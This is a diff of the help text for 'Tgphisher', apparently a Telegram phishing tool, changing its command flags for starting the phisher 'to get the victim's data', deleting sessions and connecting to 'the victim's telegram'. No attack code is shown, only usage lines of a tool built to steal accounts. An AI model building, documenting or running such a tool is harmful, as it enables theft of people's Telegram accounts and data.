@@ -28,14 +28,14 @@ ${WHITE}| Github       :${RED} https://github.com/trezhywinks${WHITE}
  
 [::] Tgphisher (commands) 
  
-tgphisher --start --pisher     : Start the phisher script to get the
-                                 victim's data.
+tgphisher -s --pisher         : Start the phisher script to get the
+                                victim's data.
 
-tgphisher --delete session     : Delete the old session if you want
-                                 to start a new session.
+tgphisher -d session.txt      : Delete the old session if you want
+                                to start a new session.
 
-tgphisher --start --telegram   : Start the script to connect with the
-                                 victim's telegram.
+tgphisher -s --telegram       : Start the script to connect with the
+                                victim's telegram.
 EOF
 }
 
